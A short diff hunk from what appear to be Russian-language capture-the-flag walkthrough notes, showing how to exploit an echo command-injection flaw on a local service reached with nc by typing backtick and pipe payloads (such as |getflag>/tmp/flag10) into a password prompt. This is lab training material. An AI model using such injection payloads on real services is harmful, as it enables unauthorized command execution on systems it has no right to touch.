@@ -56,7 +56,7 @@ end
 
 можем воспользоваться уязвимостью эхо и отправить бинарник для выполнения
 nc 127.0.0.1 5151
-пишем вместо пароля `getflag` > /tmp/getflag или |getflag > /tmp/getflag
+пишем вместо пароля `getflag`>/tmp/getflag или |getflag > /tmp/getflag
 
 Password: |getflag>/tmp/flag10
 Erf nope..
